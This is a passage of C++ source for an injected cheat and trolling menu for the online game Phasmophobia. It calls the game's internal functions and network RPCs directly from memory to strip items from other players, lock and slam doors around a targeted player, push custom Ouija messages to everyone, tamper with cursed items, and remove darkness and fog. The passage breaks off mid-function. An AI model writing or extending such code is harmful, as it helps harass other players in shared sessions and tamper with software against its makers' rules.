        const bool inGameWarmup = s_inGameEnteredAtMs != 0 && (nowMs - s_inGameEnteredAtMs) < 5000;
        if (inGameWarmup)
            return;

        __try {
            Phasmo::LevelController* lc = Phasmo_GetLevelController();
            if (!Phasmo_Safe(lc, 0xE8)) return;

            void* key = lc->key;
            if (!Phasmo_Safe(key, sizeof(Phasmo::Key)))
                return;

            // Use the validated PunRPC directly on Key. The generic PhotonView::RPC
            // path was a crash candidate because its object[] argument/signature is fragile.
            Phasmo_Call<void>(Phasmo::RVA_Key_GrabbedKey, key, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyButterFingers()
    {
        if (!MORE_ButterFingers)
            return;

        MORE_ButterFingers = false; // one-shot

        __try {
            Il2CppListPlayer* list = QueryMapPlayerList();
            if (!list)
                return;

            Phasmo::Player** entries = reinterpret_cast<Phasmo::Player**>(
                reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);

            const int32_t count = list->_size;
            for (int32_t i = 0; i < count; ++i) {
                Phasmo::Player* player = entries[i];
                if (!player || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
                    continue;

                Phasmo::PCPropGrab* grab = reinterpret_cast<Phasmo::PCPropGrab*>(player->pcPropGrab);
                if (!grab || !Phasmo_Safe(grab, sizeof(Phasmo::PCPropGrab)))
                    continue;

                int32_t itemCount = 0;
                Phasmo::PhotonObjectInteract** items = GetInteractListItems(grab->interactList, itemCount);
                if (!items)
                    continue;

                for (int32_t idx = 0; idx < itemCount; ++idx) {
                    Phasmo::PhotonObjectInteract* interact = items[idx];
                    if (!interact || !Phasmo_Safe(interact, sizeof(Phasmo::PhotonObjectInteract)))
                        continue;

                    ConfigurePickupInteract(interact);
                    Phasmo_Call<void>(Phasmo::RVA_PCPropGrab_Drop, grab, interact, nullptr);
                }
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static Phasmo::PCPropGrab* GetPropGrab(Phasmo::Player* player)
    {
        if (!player || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
            return nullptr;

        auto* grab = reinterpret_cast<Phasmo::PCPropGrab*>(player->pcPropGrab);
        return (grab && Phasmo_Safe(grab, sizeof(Phasmo::PCPropGrab))) ? grab : nullptr;
    }

    static void DropHeldFromGrab(Phasmo::PCPropGrab* grab)
    {
        if (!grab || !Phasmo_Safe(grab, sizeof(Phasmo::PCPropGrab)))
            return;

        if (!grab->isHolding)
            return;

        int32_t itemCount = 0;
        Phasmo::PhotonObjectInteract** items = GetInteractListItems(grab->interactList, itemCount);
        if (!items || itemCount <= 0)
            return;

        const int32_t idx = grab->currentIndex;
        if (idx < 0 || idx >= itemCount)
            return;

        Phasmo::PhotonObjectInteract* interact = items[idx];
        if (!interact || !Phasmo_Safe(interact, sizeof(Phasmo::PhotonObjectInteract)))
            return;

        ConfigurePickupInteract(interact);
        Phasmo_Call<void>(Phasmo::RVA_PCPropGrab_DropNetworked, grab, interact, nullptr);
    }

    static void DropInventoryFromGrab(Phasmo::PCPropGrab* grab)
    {
        if (!grab || !Phasmo_Safe(grab, sizeof(Phasmo::PCPropGrab)))
            return;

        Phasmo_Call<void>(Phasmo::RVA_PCPropGrab_DropAllInventory, grab, nullptr);
    }

    static void ApplyDropHeldLocal()
    {
        if (!MORE_DropHeldLocal)
            return;

        MORE_DropHeldLocal = false; // one-shot
        __try {
            if (!s_localPlayer)
                return;
            DropHeldFromGrab(GetPropGrab(s_localPlayer));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyDropHeldTarget()
    {
        if (!MORE_DropHeldTarget)
            return;

        MORE_DropHeldTarget = false; // one-shot
        __try {
            if (MORE_DropTargetSlot < 0)
                return;
            Phasmo::Player* player = ResolvePlayerSlot(MORE_DropTargetSlot);
            if (!player)
                return;
            DropHeldFromGrab(GetPropGrab(player));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyDropInventoryLocal()
    {
        if (!MORE_DropAllInventoryLocal)
            return;

        MORE_DropAllInventoryLocal = false; // one-shot
        __try {
            if (!s_localPlayer)
                return;
            DropInventoryFromGrab(GetPropGrab(s_localPlayer));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyDropInventoryTarget()
    {
        if (!MORE_DropAllInventoryTarget)
            return;

        MORE_DropAllInventoryTarget = false; // one-shot
        __try {
            if (MORE_DropTargetSlot < 0)
                return;
            Phasmo::Player* player = ResolvePlayerSlot(MORE_DropTargetSlot);
            if (!player)
                return;
            DropInventoryFromGrab(GetPropGrab(player));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyDropInventoryAll()
    {
        if (!MORE_DropAllInventoryAll)
            return;

        MORE_DropAllInventoryAll = false; // one-shot
        __try {
            Il2CppListPlayer* list = QueryMapPlayerList();
            if (!list)
                return;

            Phasmo::Player** entries = reinterpret_cast<Phasmo::Player**>(
                reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);

            const int32_t count = list->_size;
            for (int32_t i = 0; i < count; ++i) {
                Phasmo::Player* player = entries[i];
                if (!player || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
                    continue;
                DropInventoryFromGrab(GetPropGrab(player));
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyDropHeldFiltered()
    {
        if (!MORE_DropHeldFiltered)
            return;

        MORE_DropHeldFiltered = false; // one-shot
        __try {
            Il2CppListPlayer* list = QueryMapPlayerList();
            if (!list)
                return;

            const int32_t count = list->_size;
            for (int32_t i = 0; i < count; ++i) {
                if (!PassDropAllSlotFilter(i))
                    continue;
                Phasmo::Player* player = GetMapPlayerAt(list, i);
                if (!player || !PassDropAllOwnerFilter(player))
                    continue;
                DropHeldFromGrab(GetPropGrab(player));
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyDropInventoryFiltered()
    {
        if (!MORE_DropAllInventoryFiltered)
            return;

        MORE_DropAllInventoryFiltered = false; // one-shot
        __try {
            Il2CppListPlayer* list = QueryMapPlayerList();
            if (!list)
                return;

            const int32_t count = list->_size;
            for (int32_t i = 0; i < count; ++i) {
                if (!PassDropAllSlotFilter(i))
                    continue;
                Phasmo::Player* player = GetMapPlayerAt(list, i);
                if (!player || !PassDropAllOwnerFilter(player))
                    continue;
                DropInventoryFromGrab(GetPropGrab(player));
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  MORE: LOCK/UNLOCK ALL DOORS
    // ══════════════════════════════════════════════════════
    static bool TryDoorRpc(Phasmo::Door* door, const char* method, Phasmo::Il2CppArray* args)
    {
        if (!door || !method)
            return false;

        Phasmo::PhotonView* pv = door->photonView;
        if (!pv && door->photonInteract && Phasmo_Safe(door->photonInteract, sizeof(Phasmo::PhotonObjectInteract))) {
            auto* interact = reinterpret_cast<Phasmo::PhotonObjectInteract*>(door->photonInteract);
            pv = interact->photonView;
        }

        if (!pv || !Phasmo_Safe(pv, 0x40))
            return false;

        Il2CppString* methodName = Phasmo_StringNew(method);
        if (!methodName)
            return false;

        Phasmo_Call<void>(Phasmo::RVA_PV_RPC, pv, methodName, Phasmo::RPC_ALL, args, nullptr);
        return true;
    }

    static float DistanceSq(const Phasmo::Vec3& a, const Phasmo::Vec3& b)
    {
        const float dx = a.x - b.x;
        const float dy = a.y - b.y;
        const float dz = a.z - b.z;
        return dx * dx + dy * dy + dz * dz;
    }

    static bool TryGetDoorPosition(Phasmo::Door* door, Phasmo::Vec3& out)
    {
        if (!door || !Phasmo_Safe(door, sizeof(Phasmo::Door)))
            return false;

        void* transform = nullptr;
        if (door->photonInteract && Phasmo_Safe(door->photonInteract, sizeof(Phasmo::PhotonObjectInteract))) {
            auto* interact = reinterpret_cast<Phasmo::PhotonObjectInteract*>(door->photonInteract);
            transform = interact->transform;
        }

        if (!transform)
            transform = Phasmo_Call<void*>(Phasmo::RVA_UnityEngine_Component_get_transform, door, nullptr);
        if (!transform)
            return false;

        out = Phasmo_GetPosition(transform);
        return true;
    }

    static void TriggerDoorRattle(Phasmo::Door* door)
    {
        if (!door)
            return;
        if (Phasmo::RVA_Door_PlayDoorRattlingNoise)
            Phasmo_Call<void>(Phasmo::RVA_Door_PlayDoorRattlingNoise, door, 0, nullptr, nullptr);
    }

    static void TriggerDoorNetworkFx(Phasmo::Door* door, bool slam, bool rattle, bool lockSound, bool unlockSound)
    {
        if (!door)
            return;
        if (slam && Phasmo::RVA_Door_PlayDoorSlamNoise)
            Phasmo_Call<void>(Phasmo::RVA_Door_PlayDoorSlamNoise, door, nullptr, nullptr);
        if (rattle)
            TriggerDoorRattle(door);
        if (lockSound && Phasmo::RVA_Door_NetworkedPlayLockSound)
            Phasmo_Call<void>(Phasmo::RVA_Door_NetworkedPlayLockSound, door, nullptr);
        if (unlockSound && Phasmo::RVA_Door_NetworkedPlayUnlockSound)
            Phasmo_Call<void>(Phasmo::RVA_Door_NetworkedPlayUnlockSound, door, nullptr);
    }

    static void SetDoorLockedState(Phasmo::Door* door, bool locked)
    {
        if (!door || !Phasmo_Safe(door, sizeof(Phasmo::Door)))
            return;

        door->boolFlags[0] = locked;
        if (Phasmo::RVA_Door_ToggleDoorLock)
            Phasmo_Call<void>(Phasmo::RVA_Door_ToggleDoorLock, door, locked, true, nullptr);

        if (locked) {
            if (Phasmo::RVA_Door_LockDoor)
                Phasmo_Call<void>(Phasmo::RVA_Door_LockDoor, door, true, nullptr);
        }
        else {
            if (Phasmo::RVA_Door_AttemptToUnlockDoor)
                Phasmo_Call<void>(Phasmo::RVA_Door_AttemptToUnlockDoor, door, nullptr);
            if (Phasmo::RVA_Door_UnlockDoor)
                Phasmo_Call<void>(Phasmo::RVA_Door_UnlockDoor, door, nullptr);
        }
    }

    static void OpenDoorReliable(Phasmo::Door* door)
    {
        if (!door || !Phasmo_Safe(door, sizeof(Phasmo::Door)))
            return;

        SetDoorLockedState(door, false);

        if (Phasmo::RVA_Door_OpenDoor) {
            Phasmo_Call<void>(Phasmo::RVA_Door_OpenDoor, door, 1.0f, true, false, nullptr);
            Phasmo_Call<void>(Phasmo::RVA_Door_OpenDoor, door, 1.0f, true, true, nullptr);
        }
    }

    static void CloseDoorReliable(Phasmo::Door* door)
    {
        if (!door || !Phasmo_Safe(door, sizeof(Phasmo::Door)))
            return;

        if (Phasmo::RVA_Door_HuntingCloseDoor)
            Phasmo_Call<void>(Phasmo::RVA_Door_HuntingCloseDoor, door, nullptr);
    }

    static void ApplyDoorControls()
    {
        static uint64_t nextCloseLoopTick = 0;
        static uint64_t nextLockLoopTick = 0;
        static uint64_t nextOpenLoopTick = 0;
        static bool lockLoopState = false;
        static bool openLoopState = false;

        bool doCloseLoop = false;
        bool doLockLoop = false;
        bool doOpenLoop = false;

        const uint64_t now = GetTickCount64();

        if (MORE_CloseDoorsLoop) {
            if (now >= nextCloseLoopTick) {
                int delayMs = MORE_CloseDoorsLoopDelayMs;
                if (delayMs < 10) delayMs = 10;
                if (delayMs > 5000) delayMs = 5000;
                nextCloseLoopTick = now + static_cast<uint64_t>(delayMs);
                doCloseLoop = true;
            }
        }

        if (MORE_LockUnlockDoorsLoop) {
            if (now >= nextLockLoopTick) {
                int delayMs = MORE_LockUnlockDoorsLoopDelayMs;
                if (delayMs < 50) delayMs = 50;
                if (delayMs > 8000) delayMs = 8000;
                nextLockLoopTick = now + static_cast<uint64_t>(delayMs);
                lockLoopState = !lockLoopState;
                doLockLoop = true;
            }
        }

        if (MORE_OpenCloseDoorsLoop) {
            if (now >= nextOpenLoopTick) {
                int delayMs = MORE_OpenCloseDoorsLoopDelayMs;
                if (delayMs < 50) delayMs = 50;
                if (delayMs > 8000) delayMs = 8000;
                nextOpenLoopTick = now + static_cast<uint64_t>(delayMs);
                openLoopState = !openLoopState;
                doOpenLoop = true;
            }
        }

        if (!MORE_LockDoors && !MORE_UnlockDoors && !MORE_CloseDoors && !MORE_CloseDoorsLoop
            && !MORE_LockUnlockDoorsLoop && !MORE_OpenCloseDoorsLoop
            && !MORE_DisableDoorInteraction && !MORE_WalkThroughDoors
            && !MORE_DoorSlamAll && !MORE_DoorRattleAll && !MORE_DoorLockSoundAll && !MORE_DoorUnlockSoundAll) return;

        __try {
            void* doorsArray = Phasmo_GetDoors();
            if (!Phasmo_Safe(doorsArray, 0x20)) return;

            // Il2Cpp array: length at 0x18, elements start at 0x20
            int32_t count = *reinterpret_cast<int32_t*>(
                reinterpret_cast<uint8_t*>(doorsArray) + Phasmo::ARRAY_LENGTH);

            if (count <= 0 || count > 500) return;

            for (int i = 0; i < count; i++) {
                Phasmo::Door* door = *reinterpret_cast<Phasmo::Door**>(
                    reinterpret_cast<uint8_t*>(doorsArray) + Phasmo::ARRAY_FIRST_ELEMENT + i * sizeof(void*));

                if (!Phasmo_Safe(door, sizeof(Phasmo::Door))) continue;

                bool doLock = MORE_LockDoors;
                bool doUnlock = MORE_UnlockDoors;
                if (doLockLoop) {
                    if (lockLoopState)
                        doLock = true;
                    else
                        doUnlock = true;
                }

                if (doLock) {
                    SetDoorLockedState(door, true);
                }
                if (doUnlock) {
                    SetDoorLockedState(door, false);
                }
                const bool doOpen = doOpenLoop && openLoopState;
                const bool doClose = MORE_CloseDoors || doCloseLoop || (doOpenLoop && !openLoopState);

                if (doOpen) {
                    OpenDoorReliable(door);
                }

                if (doClose) {
                    CloseDoorReliable(door);
                }
                TriggerDoorNetworkFx(door, MORE_DoorSlamAll, MORE_DoorRattleAll, MORE_DoorLockSoundAll, MORE_DoorUnlockSoundAll);
                if (door->photonInteract && Phasmo_Safe(door->photonInteract, sizeof(Phasmo::PhotonObjectInteract))) {
                    Phasmo::PhotonObjectInteract* interact = reinterpret_cast<Phasmo::PhotonObjectInteract*>(door->photonInteract);
                    interact->isUsable = !MORE_DisableDoorInteraction;
                }
                if (door->collider && Phasmo_Safe(door->collider, 0x20)) {
                    Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Collider_set_enabled, door->collider, !MORE_WalkThroughDoors, nullptr);
                }
            }

            // Reset after one-shot
            MORE_LockDoors = false;
            MORE_UnlockDoors = false;
            MORE_CloseDoors = false;
            MORE_DoorSlamAll = false;
            MORE_DoorRattleAll = false;
            MORE_DoorLockSoundAll = false;
            MORE_DoorUnlockSoundAll = false;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyDoorTrollNearTarget()
    {
        const bool wantsClose = MORE_TargetDoorClose;
        const bool wantsLock = MORE_TargetDoorLock;
        const bool wantsSlam = MORE_TargetDoorSlam;
        const bool wantsRattle = MORE_TargetDoorRattle;
        const bool wantsLockSound = MORE_TargetDoorLockSound;
        const bool wantsUnlockSound = MORE_TargetDoorUnlockSound;
        if (!wantsClose && !wantsLock && !wantsSlam && !wantsRattle && !wantsLockSound && !wantsUnlockSound)
            return;

        MORE_TargetDoorClose = false;
        MORE_TargetDoorLock = false;
        MORE_TargetDoorSlam = false;
        MORE_TargetDoorRattle = false;
        MORE_TargetDoorLockSound = false;
        MORE_TargetDoorUnlockSound = false;

        __try {
            if (!IsInGame() || MORE_DropTargetSlot < 0)
                return;

            Phasmo::Player* target = ResolvePlayerSlot(MORE_DropTargetSlot);
            if (!target)
                return;

            Phasmo::Vec3 targetPos{};
            if (!TryGetPlayerCharacterPosition(target, targetPos))
                return;

            float radius = MORE_TargetDoorRadius;
            if (radius < 0.5f) radius = 0.5f;
            if (radius > 20.0f) radius = 20.0f;
            const float radiusSq = radius * radius;

            void* doorsArray = Phasmo_GetDoors();
            if (!Phasmo_Safe(doorsArray, 0x20))
                return;

            int32_t count = *reinterpret_cast<int32_t*>(
                reinterpret_cast<uint8_t*>(doorsArray) + Phasmo::ARRAY_LENGTH);
            if (count <= 0)
                return;
            if (count > 500)
                count = 500;

            for (int32_t i = 0; i < count; ++i) {
                Phasmo::Door* door = *reinterpret_cast<Phasmo::Door**>(
                    reinterpret_cast<uint8_t*>(doorsArray) + Phasmo::ARRAY_FIRST_ELEMENT + i * sizeof(void*));
                if (!door || !Phasmo_Safe(door, sizeof(Phasmo::Door)))
                    continue;

                Phasmo::Vec3 doorPos{};
                if (!TryGetDoorPosition(door, doorPos))
                    continue;
                if (DistanceSq(doorPos, targetPos) > radiusSq)
                    continue;

                if (wantsLock) {
                    SetDoorLockedState(door, true);
                }

                if (wantsClose || wantsSlam) {
                    CloseDoorReliable(door);
                }

                TriggerDoorNetworkFx(door, false, wantsRattle, wantsLockSound, wantsUnlockSound);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static Photon_Pun_PhotonView_o* GetOuijaPhotonView(void* board)
    {
        if (!board || !Phasmo_Safe(board, 0x30))
            return nullptr;

        auto** viewPtr = reinterpret_cast<Photon_Pun_PhotonView_o**>(
            reinterpret_cast<uint8_t*>(board) + 0x20);
        if (!viewPtr)
            return nullptr;

        Photon_Pun_PhotonView_o* view = *viewPtr;
        return (view && Phasmo_Safe(view, 0x40)) ? view : nullptr;
    }

    static bool TrySetOuijaMessage(const char* message, bool broadcast)
    {
        if (!message || !*message)
            return false;

        Phasmo::CursedItemsController* ci = Phasmo_GetCursedItemsController();
        if (!ci || !ci->ouijaBoard || !Phasmo_Safe(ci->ouijaBoard, 0x60))
            return false;

        Il2CppString* text = Phasmo_StringNew(message);
        if (!text)
            return false;

        Photon_Pun_PhotonMessageInfo_o info{};
        info.fields.timeInt = static_cast<int32_t>(GetTickCount64());
        info.fields.Sender = nullptr;
        info.fields.photonView = GetOuijaPhotonView(ci->ouijaBoard);

        __try {
            Phasmo_Call<void>(Phasmo::RVA_OuijaBoard_PlayMessageSequence, ci->ouijaBoard, text, info, nullptr);
            if (broadcast)
                Phasmo_Call<void>(Phasmo::RVA_OuijaBoard_NetworkedUse, ci->ouijaBoard, info, nullptr);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    static void ApplyCustomOuijaText()
    {
        if (!CURSED_OuijaApplyNow)
            return;
        CURSED_OuijaApplyNow = false;
        if (!TrySetOuijaMessage(CURSED_OuijaText, CURSED_OuijaNetworked))
            Logger::WriteLine("[Phasmo] Failed to apply Ouija text.");
    }

    // ══════════════════════════════════════════════════════
    //  CURSED: INFINITY TAROT CARDS
    // ══════════════════════════════════════════════════════
    static void ApplyCursedItemControls()
    {
        Phasmo::CursedItemsController* ci = Phasmo_GetCursedItemsController();
        if (!ci)
            return;

        void* cursedItems[] = {
            ci->ouijaBoard,
            ci->musicBox,
            ci->tarotCards,
            ci->summoningCircle,
            ci->hauntedMirror,
            ci->voodooDoll,
            ci->monkeyPaw
        };

        for (void* item : cursedItems) {
            if (!item || !Phasmo_Safe(item, 0x60))
                continue;

            if (CURSED_BreakItems)
                Phasmo_Call<void>(Phasmo::RVA_CursedItem_BreakItem, item, nullptr);
            if (CURSED_UseItems)
                Phasmo_Call<void>(Phasmo::RVA_CursedItem_TryUse, item, nullptr);
        }

        auto triggerSpecific = [](void* item, bool& trigger) {
            if (!trigger)
                return;
            trigger = false;
            if (!item || !Phasmo_Safe(item, 0x60))
                return;
            Phasmo_Call<void>(Phasmo::RVA_CursedItem_TryUse, item, nullptr);
        };

        triggerSpecific(ci->ouijaBoard, CURSED_TriggerOuijaBoard);
        triggerSpecific(ci->musicBox, CURSED_TriggerMusicBox);
        triggerSpecific(ci->tarotCards, CURSED_TriggerTarotCards);
        triggerSpecific(ci->summoningCircle, CURSED_TriggerSummoningCircle);
        triggerSpecific(ci->hauntedMirror, CURSED_TriggerHauntedMirror);
        triggerSpecific(ci->voodooDoll, CURSED_TriggerVoodooDoll);
        triggerSpecific(ci->monkeyPaw, CURSED_TriggerMonkeyPaw);

        CURSED_BreakItems = false;
        CURSED_UseItems = false;

        void* tarotCards = ci->tarotCards;
        if (tarotCards && Phasmo_Safe(tarotCards, sizeof(Phasmo::TarotCards))) {
            Phasmo::TarotCards* cards = reinterpret_cast<Phasmo::TarotCards*>(tarotCards);
            cards->forcedCard.hasValue = true;
            cards->forcedCard.value = MapTarotUiIndexToEnum(CURSED_NextTarotCard);
        }
    }

    static void ApplyInfinityCards()
    {
        if (!CURSED_InfinityCards) return;

        __try {
            Phasmo::CursedItemsController* ci = Phasmo_GetCursedItemsController();
            if (!ci) return;

            // Access TarotCards object from the controller
            void* tarotCards = ci->tarotCards;
            if (!Phasmo_Safe(tarotCards, sizeof(Phasmo::TarotCards))) return;

            Phasmo::TarotCards* cards = reinterpret_cast<Phasmo::TarotCards*>(tarotCards);
            cards->inUse = false;
            cards->hasBroken = false;
            cards->hasInitialised = true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  VISUAL: FULLBRIGHT
    //  Force all lights on via FuseBox
    // ══════════════════════════════════════════════════════
    static void ForceLightOn(void* light, float intensity)
    {
        if (!light || !Phasmo_Safe(light, 0x40))
            return;

        Phasmo::Color white = { 1.0f, 1.0f, 1.0f, 1.0f };
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Behaviour_set_enabled, light, true, nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_color, light, white, nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_intensity, light, intensity, nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_bounceIntensity, light, std::max(1.25f, intensity * 0.6f), nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_range, light, std::max(35.0f, intensity * 8.0f), nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_shadowStrength, light, 0.0f, nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_shadowBias, light, 0.0f, nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_shadowNormalBias, light, 0.0f, nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_shadows, light, 0, nullptr);
        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Light_set_renderMode, light, 2, nullptr);
    }

    static void ApplyFullbright()
    {
        if (!VIS_Fullbright) return;

        __try {
            static ULONGLONG s_nextEnvironmentApplyAt = 0;
            const int mode = VIS_FullbrightMode;
            const bool inRound = IsInGame();
            const bool lobbyScene = !inRound;
            const float scale = std::clamp(VIS_FullbrightIntensity, 0.1f, 5.0f);
            const bool mapReveal = (mode == 2);
            const bool everywhere = (mode == 3);
            const bool wantsAmbientAndWeather = lobbyScene || (mode == 0 || mapReveal || everywhere);
            const bool wantsSceneLights = lobbyScene || (mode == 1 || mapReveal || everywhere);
            const float ambientBase = mapReveal ? 6.0f : 4.4f;
            const float sceneBase = mapReveal ? 7.5f : 5.8f;
            const float directionalBase = mapReveal ? 6.5f : 4.8f;
            const float globalBoost = everywhere ? 1.35f : 1.0f;
            const float ambientIntensity = ambientBase * scale * globalBoost;
            const float sceneLightIntensity = sceneBase * scale * globalBoost;
            const float directionalIntensity = directionalBase * scale * globalBoost;
            const ULONGLONG nowMs = GetTickCount64();
            if (nowMs >= s_nextEnvironmentApplyAt) {
                s_nextEnvironmentApplyAt = nowMs + 350ULL;
                Phasmo::Color white = { 1.0f, 1.0f, 1.0f, 1.0f };
                Phasmo_Call<void>(Phasmo::RVA_RenderSettings_set_fog, false, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_RenderSettings_set_fogColor, white, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_RenderSettings_set_fogDensity, 0.0f, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_RenderSettings_set_ambientLight, white, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_RenderSettings_set_ambientSkyColor, white, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_RenderSettings_set_ambientEquatorColor, white, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_RenderSettings_set_ambientGroundColor, white, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_RenderSettings_set_ambientIntensity, ambientIntensity, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_QualitySettings_set_pixelLightCount, 64, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_QualitySettings_set_shadowCascades, 0, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_QualitySettings_set_shadowDistance, 0.0f, nullptr);
            }
            if (wantsAmbientAndWeather) {
                Phasmo::FuseBox* fb = Phasmo_GetFuseBox();
                if (fb) {
                    fb->isOn = true;

                    void* lightsArray = fb->lights;
                    if (lightsArray && Phasmo_Safe(lightsArray, Phasmo::ARRAY_LENGTH + sizeof(void*))) {
                        int32_t count = *reinterpret_cast<int32_t*>(
                            reinterpret_cast<uint8_t*>(lightsArray) + Phasmo::ARRAY_LENGTH);
                        const int32_t maxLights = 128;
                        if (count > maxLights)
                            count = maxLights;

                        for (int32_t i = 0; i < count; ++i) {
                            void* light = *reinterpret_cast<void**>(
                                reinterpret_cast<uint8_t*>(lightsArray) + Phasmo::ARRAY_FIRST_ELEMENT + i * sizeof(void*));
                            if (!light || !Phasmo_Safe(light, 0x40))
                                continue;

                            ForceLightOn(light, sceneLightIntensity);
                        }
                    }
                }

                Phasmo::RandomWeather* randomWeather = Phasmo_GetRandomWeather();
                if (randomWeather && Phasmo_Safe(randomWeather, sizeof(Phasmo::RandomWeather))) {
                    if (randomWeather->currentWeatherProfile &&
                        Phasmo_Safe(randomWeather->currentWeatherProfile, sizeof(Phasmo::WeatherProfile))) {
                        randomWeather->currentWeatherProfile->fogColor = { 1.0f, 1.0f, 1.0f, 1.0f };
                        randomWeather->currentWeatherProfile->fogDensity = 0.0f;
                        randomWeather->currentWeatherProfile->timeOfDay = everywhere ? 13.0f : 12.0f;
                    }

                    if (randomWeather->directionalLight)
                        ForceLightOn(randomWeather->directionalLight, directionalIntensity);
                }
            }

            if (wantsSceneLights) {
                static DWORD lastScan = 0;
                DWORD now = GetTickCount();
                const DWORD scanDelayMs = lobbyScene ? 1200 : (everywhere ? 900 : 600);
                if (now - lastScan > scanDelayMs) {
                    lastScan = now;
                    Phasmo::Il2CppArray* lights = Phasmo_FindObjectsOfTypeAll("UnityEngine", "Light", "UnityEngine.CoreModule");
                    if (lights && Phasmo_Safe(lights, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*))) {
                        int32_t count = lights->max_length;
                        if (count > 2048)
                            count = 2048;

                        const size_t bytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(std::max(0, count)) * sizeof(void*);
                        if (count > 0 && Phasmo_Safe(lights, bytes)) {
                            for (int32_t i = 0; i < count; ++i) {
                                void* light = *reinterpret_cast<void**>(
                                    reinterpret_cast<uint8_t*>(lights) + Phasmo::ARRAY_FIRST_ELEMENT + i * sizeof(void*));
                                ForceLightOn(light, sceneLightIntensity);
                            }
                        }
                    }
                }
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  VISUAL: WATERMARK
    // ══════════════════════════════════════════════════════
    static void DrawWatermark()
    {
        if (!VIS_Watermark) return;
        if (!ImGui::GetCurrentContext()) return;

        ImDrawList* dl = ImGui::GetForegroundDrawList();
        if (!dl) return;

        const bool inGame = IsInGame();
        const float pad = 12.0f;
        const ImVec2 pos(12.0f, 12.0f);
        const ImVec2 size(190.0f, 46.0f);
        const ImVec2 max(pos.x + size.x, pos.y + size.y);

        dl->AddRectFilled(pos, max, IM_COL32(20, 12, 22, 214), 14.0f);
        dl->AddRect(pos, max, IM_COL32(126, 78, 104, 230), 14.0f, 0, 1.0f);
        dl->AddRectFilled(ImVec2(pos.x, pos.y), ImVec2(pos.x + 3.5f, max.y), IM_COL32(242, 131, 183, 255), 14.0f, ImDrawFlags_RoundCornersLeft);
        dl->AddRectFilled(ImVec2(pos.x + 8.0f, pos.y + 8.0f), ImVec2(pos.x + 10.0f, max.y - 8.0f), IM_COL32(255, 190, 218, 205), 3.0f);

        dl->AddText(ImVec2(pos.x + pad, pos.y + 6.5f), IM_COL32(255, 243, 248, 245), "Airi");
        dl->AddText(ImVec2(pos.x + 52.0f, pos.y + 7.5f), IM_COL32(241, 155, 192, 235), "soft");

        char status[96];
        snprintf(status, sizeof(status), "%s  |  %s", inGame ? "contract" : "lobby", "chino");
        dl->AddText(ImVec2(pos.x + pad, pos.y + 25.0f), IM_COL32(212, 186, 198, 228), status);
    }

    // ══════════════════════════════════════════════════════
    //  VISUAL: ACTIVITY MONITOR
    // ══════════════════════════════════════════════════════
    static void DrawActivityMonitor()
    {
        if (!VIS_ActivityMonitor) return;

        if (!ImGui::GetCurrentContext())
            return;

        const bool inGame = IsInGame();
        const ULONGLONG nowMs = GetTickCount64();
        const bool inGameWarmup = inGame && s_inGameEnteredAtMs != 0 && (nowMs - s_inGameEnteredAtMs) < 5000;

        ImGui::SetNextWindowSize(ImVec2(320, 180), ImGuiCond_FirstUseEver);
        if (!ImGui::Begin("Activity Monitor", &VIS_ActivityMonitor)) {
            ImGui::End();
            return;
        }

        if (!inGame) {
            ImGui::Text("State: LOBBY / MENU");
            ImGui::Separator();
            ImGui::TextDisabled("Live ghost activity is disabled outside a contract.");
            ImGui::End();
            return;
        }

        if (inGameWarmup) {
            ImGui::Text("State: WARMING UP");
            ImGui::Separator();
            ImGui::TextDisabled("Waiting a few seconds after map load before reading ghost activity.");
            ImGui::End();
            return;
        }

        Phasmo::GhostAI* ghost = Phasmo_GetGhostAI();
        if (!ghost || !Phasmo_Safe(ghost, sizeof(Phasmo::GhostAI))) {
            ImGui::Text("State: IN GAME");
            ImGui::Separator();
            ImGui::TextDisabled("GhostAI not available yet.");
